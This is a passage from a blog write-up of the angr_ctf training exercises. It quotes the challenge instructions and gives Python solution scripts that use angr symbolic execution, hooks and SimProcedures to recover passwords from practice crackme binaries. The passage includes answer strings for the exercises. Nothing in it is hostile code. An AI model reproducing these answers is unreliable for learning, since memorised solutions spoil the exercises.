class="number">0xA1BA1D0</span></span><br><span class="line">  password3_address = <span class="number">0xA1BA1D8</span></span><br><span class="line"></span><br><span class="line">  initial_state.memory.store(password0_address, password0)</span><br><span class="line">  initial_state.memory.store(password1_address, password1)</span><br><span class="line">  initial_state.memory.store(password2_address, password2)</span><br><span class="line">  initial_state.memory.store(password3_address, password3)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution3 = solution_state.solver.<span class="built_in">eval</span>(password3, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    ...</span><br><span class="line">    print(solution0, solution1, solution2, solution3)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Keyword: initial_state.memory.store(address, value)</p><h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><blockquote><p>  Instead of telling the binary to write to the address of the memory  allocated with malloc, we can simply fake an address to any unused block of memory and overwrite the pointer to the data. This will point the pointer with the address of pointer_to_malloc_memory_address0 to fake_heap_address.<br>  Be aware, there is more than one pointer! Analyze the binary to determine global location of each pointer.<br>  Note: by default, Angr stores integers in memory with big-endianness. To specify to use the endianness of your architecture, use the parameter endness=project.arch.memory_endness. On x86, this is little-endian.</p></blockquote><p>The key to this challenge is that we skipped malloc at the address at the beginning, so we have to manually allocate a fake heap address for it.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048699</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  fake_heap_address0 = <span class="number">0xABCC800</span></span><br><span class="line">  pointer_to_malloc_memory_address0 = <span class="number">0xABCC8A4</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">  fake_heap_address1 = <span class="number">0xABCC7e0</span></span><br><span class="line">  pointer_to_malloc_memory_address1 = <span class="number">0xABCC8AC</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Store our symbolic values at our fake_heap_address. Look at the binary to</span></span><br><span class="line">  <span class="comment"># determine the offsets from the fake_heap_address where scanf writes.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.memory.store(fake_heap_address0, password0)</span><br><span class="line">  initial_state.memory.store(fake_heap_address1, password1)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    print(solution0, solution1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Keyword: state.memory.store(address, value, endness=project.arch.memory_endness)</p><h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><blockquote><p>This challenge could, in theory, be solved in multiple ways. However, <em>for</em> the</p><p>sake of learning how to simulate an alternate filesystem, please solve this</p><p>challenge according to structure provided below. As a challenge, once you have</p><p>an initial solution, <em>try</em> solving this <em>in</em> an alternate way.</p><p>Problem description and general solution strategy:</p><p>The binary loads the password <em>from</em> a file using the fread function. If the</p><p>password is correct, it prints â€œGood Job.â€ In order to keep consistency <em>with</em></p><p>the other challenges, the input <em>from</em> the console is written to a file in the </p><p>ignore_me function. As the name suggests, ignore it, <em>as</em> it only exists to</p><p>maintain consistency <em>with</em> other challenges.</p><p>We want to:</p><p>\1. Determine the file <em>from</em> which fread reads.</p><p>\2. Use Angr to simulate a filesystem where that file is replaced <em>with</em> our own</p><p>   simulated file.</p><p>\3. Initialize the file <em>with</em> a symbolic value, which will be read <em>with</em> fread</p><p>   and propogated through the program.</p><p>\4. Solve <em>for</em> the symbolic input to determine the password.</p><p>Construct a bitvector <em>for</em> the password and then store it <em>in</em> the fileâ€™s</p><p>  backing memory. The store method works exactly the same <em>as</em> the store method</p><p>  you have already used. In fact, itâ€™s the exact same method! That means that</p><p>  memory.store(address, bitvector) will write bitvector to the address we</p><p>  specify. In this memory, unlike our programâ€™s memory, we want to write to</p><p>  the beginning, <em>as</em> the Linux file will stream data <em>from</em> the beginning of the</p><p>  file. For example, imagine a simple file, â€˜hello.txtâ€™:</p><p>  Hello world, my name is John.</p><p>  ^                       ^</p><p>  ^ address 0             ^ address 24 (count the number of characters)</p><p>  In order to represent this in memory, we would want to write the string to</p><p>  the beginning of the file:</p><p>  hello_txt_contents = claripy.BVV(â€˜Hello world, my name is John.â€™, 30*8)</p><p>  hello_txt_backing_memory.store(0, hello_txt_contents)</p><p>  Perhaps, then, we would want to replace John <em>with</em> a</p><p>  symbolic variable. We would call:</p><p>  name_bitvector = claripy.BVS(â€˜symbolic_nameâ€™, 4*8)</p><p>  hello_txt_backing_memory.store(24, name_bitvector)</p><p>  Then, after the program calls fopen(â€˜hello.txtâ€™, â€˜râ€™) and then</p><p>  fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain</p><p>  the string <em>from</em> the file, <em>except</em> four symbolic bytes where the name would be</p><p>  stored.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_address = <span class="number">0x080488D6</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=initial_address)</span><br><span class="line"></span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">64</span> * <span class="number">8</span>)</span><br><span class="line">  </span><br><span class="line">  filename = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">  simfile = angr.storage.SimFile(name=filename, content=password, size=<span class="number">64</span>)</span><br><span class="line">  initial_state.fs.insert(filename, simfile)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=good, avoid=bad)</span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keyword: angr.storage.SimFile(name=filename, content=symbolic_vector, size=file_size), initial_state.fs.insert(filename, simfile)</p><h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><blockquote><p>The binary asks <em>for</em> a 16 character password to which is applies a complex function and then compares <em>with</em> a reference string <em>with</em> the function check<em>equals</em>[reference string]. (Decompile the binary and take a look at it!)</p><p>The source code <em>for</em> this function is provided here. However, the reference string <em>in</em> your version will be different than AABBCCDDEEFFGGHH.</p><p>The function checks if *to_check == â€œAABBCCDDEEFFGGHHâ€. Verify this yourself. While you, as a human, can easily determine that this function is equivalent to simply comparing the strings, the computer cannot. Instead the computer  would need to branch every time the if statement in the loop was called (16  times), resulting in 2^16 = 65,536 branches, which will take too long of a  time to evaluate for our needs.</p><p>We do not know how the complex_function works, but we want to find an input that, when modified by complex_function, will produce the string: AABBCCDDEEFFGGHH.</p><p>In this puzzle, your goal will be to stop the program before this function is called and manually constrain the to_check variable to be equal to the password you identify by decompiling the binary. Since, you, as a human, know that if the strings are equal, the program will print â€œGood Job.â€, you can be assured that if the program can solve for an input that makes them equal, the input will be the correct password.</p></blockquote><p>Source code:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REFERENCE_PASSWORD = <span class="meta-string">&quot;AABBCCDDEEFFGGHH&quot;</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_equals_AABBCCDDEEFFGGHH</span><span class="params">(<span class="keyword">char</span>* to_check, <span class="keyword">size_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> num_correct = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (to_check[i] == REFERENCE_PASSWORD[i]) &#123;</span><br><span class="line">      num_correct += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num_correct == length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* input = user_input();</span><br><span class="line"><span class="keyword">char</span>* encrypted_input = complex_function(input);</span><br><span class="line"><span class="keyword">if</span> (check_equals_AABBCCDDEEFFGGHH(encrypted_input, <span class="number">16</span>)) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This challenge is quite practical. I have seen many ctf challenges using this writing method: compare the input string with the target string character by character. This is easy for us humans, but not for computers. When we use symbols to execute, this challenge has 16 characters, so we have to compare 2 to the 16th power, which is obviously unbearable. In order to solve this problem, we need to manually specify constraints. </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation_manager = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  target_address = <span class="number">0x0804866E</span></span><br><span class="line">  simulation_manager.explore(find=target_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation_manager.found:</span><br><span class="line">    solution_state = simulation_manager.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  constrained_parameter_address = <span class="number">0x0804A050</span></span><br><span class="line">  constrained_parameter_size = <span class="number">16</span></span><br><span class="line">  constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_address, constrained_parameter_size)</span><br><span class="line"></span><br><span class="line">  solution_state.add_constraints(constrained_parameter_bitvector == <span class="string">&#x27;AUPDNNPROEZRJWKB&#x27;</span>)</span><br><span class="line">  print(solution_state.posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keyword: solution_state.memory.load(target_address, size), solution_state.add_constraints(input == target)</p><h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><blockquote><p> This level performs the following computations:</p><ol><li>Get 16 bytes of user input and encrypt it.</li><li>Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)</li><li>Get another 16 bytes from the user and encrypt it.</li><li><p>Check that itâ€™s equal to a predefined password.</p><p>The ONLY part of this program that we have to worry about is #2.We will be replacing the call to check<em>equals</em> with our own version, using a hook, since check<em>equals</em> will run too slowly otherwise.</p></li></ol></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  </span><br><span class="line">  instrction_step_address = <span class="number">0x80486B3</span></span><br><span class="line">  jump_size = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  @project.hook(<span class="params">instrction_step_address, length=jump_size</span>)</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals</span>(<span class="params">state</span>):</span></span><br><span class="line">    user_input_string = state.memory.load(<span class="number">0x0804A054</span>, <span class="number">16</span>)</span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">      user_input_string == <span class="string">&#x27;XYMKBKUHNIQYNQXE&#x27;</span>,</span><br><span class="line">      claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">      claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=good, avoid=bad)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;cannot find it!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Detailed explanation of hook: <a href="https://docs.angr.io/extending-angr/simprocedures#user-hooks">https://docs.angr.io/extending-angr/simprocedures#user-hooks</a></p><p>Keyword: @project.hook(address, length) func(state): â€¦</p><h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><blockquote><p>You may be thinking:<br>  Why canâ€™t I just use hooks? The function is called many times, but if I hook the address of the function itself (rather than the addresses where it is  called), I can replace its behavior everywhere. Furthermore, I can get the  parameters by reading them off the stack (with memory.load(regs.esp + xx)), and return a value by simply setting eax! Since I know the length of the function in bytes, I can return from the hook just before the â€˜retâ€™  instruction is called, which will allow the program to jump back to where it  was before it called my hook.<br>If you thought that, then congratulations! You have just invented the idea of SimProcedures! Instead of doing all of that by hand, you can let the already-implemented SimProcedures do the boring work for you so that you can focus on writing a replacement function in a Pythonic way.<br>As a bonus, SimProcedures allow you to specify custom calling conventions, but unfortunately it is not covered in this CTF.</p><pre><code>A SimProcedure replaces a function in the binary with a simulated one   written in Python. Other than it being written in Python, the function    acts largely the same as any function written in C. Any parameter after  &#39;self&#39; will be treated as a parameter to the function you are replacing.The parameters will be bitvectors. Additionally, the Python can return in    the ususal Pythonic way. Angr will treat this in the same way it would    treat a native function in the binary returning. An example:int add_if_positive(int a, int b) &#123;  if (a &gt;= 0 &amp;&amp; b &gt;= 0) return a + b;  else return 0;&#125;could be simulated with...class ReplacementAddIfPositive(angr.SimProcedure):  def run(self, a, b):    if a &gt;= 0 and b &gt;=0:      return a + b    else:      return 0Finish the parameters to the check_equals_ function. Reminder:   int check_equals_AABBCCDDEEFFGGHH(char* to_check, int length) &#123; ...(!)</code></pre></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, to_check, length</span>):</span></span><br><span class="line">      <span class="comment"># We can almost copy and paste the solution from the previous challenge.</span></span><br><span class="line">      <span class="comment"># Hint: Don&#x27;t look up the address! It&#x27;s passed as a parameter.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      user_input_buffer_address = to_check</span><br><span class="line">      user_input_buffer_length = length</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Note the use of self.state to find the state of the system in a SimProcedure.</span></span><br><span class="line">      user_input_string = self.state.memory.load(</span><br><span class="line">        user_input_buffer_address,</span><br><span class="line">        user_input_buffer_length</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      check_against_string = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment"># Finally, instead of setting eax, we can use a Pythonic return statement</span></span><br><span class="line">      <span class="comment"># to return the output of this function. </span></span><br><span class="line">      <span class="comment"># Hint: Look at the previous solution.</span></span><br><span class="line">      <span class="keyword">return</span> claripy.If(user_input_string ==  check_against_string, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Hook the check_equals symbol. Angr automatically looks up the address </span></span><br><span class="line">  <span class="comment"># associated with the symbol. Alternatively, you can use &#x27;hook&#x27; instead</span></span><br><span class="line">  <span class="comment"># of &#x27;hook_symbol&#x27; and specify the address of the function. To find the </span></span><br><span class="line">  <span class="comment"># correct symbol, disassemble the binary.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  check_equals_symbol = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span> <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This time, the solution involves simply replacing scanf with our own version,</span></span><br><span class="line"><span class="comment"># since Angr does not support requesting multiple parameters with scanf.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="comment"># Finish the parameters to the scanf function. Hint: &#x27;scanf(&quot;%u %u&quot;, ...)&#x27;.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, scanf0_address, scanf1_address</span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="comment"># The scanf function writes user input to the buffers to which the parameters point.</span></span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Now, we want to &#x27;set aside&#x27; references to our symbolic values in the</span></span><br><span class="line">      <span class="comment"># globals plugin included by default with a state. You will need to</span></span><br><span class="line">      <span class="comment"># store multiple bitvectors. You can either use a list, tuple, or multiple</span></span><br><span class="line">      <span class="comment"># keys to reference the different bitvectors.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0</span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Grab whatever you set aside in the globals dict.</span></span><br><span class="line">    stored_solutions0 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]</span><br><span class="line">    stored_solutions1 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    print(solution_state.solver.<span class="built_in">eval</span>(stored_solutions0), solution_state.solver.<span class="built_in">eval</span>(stored_solutions1))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" 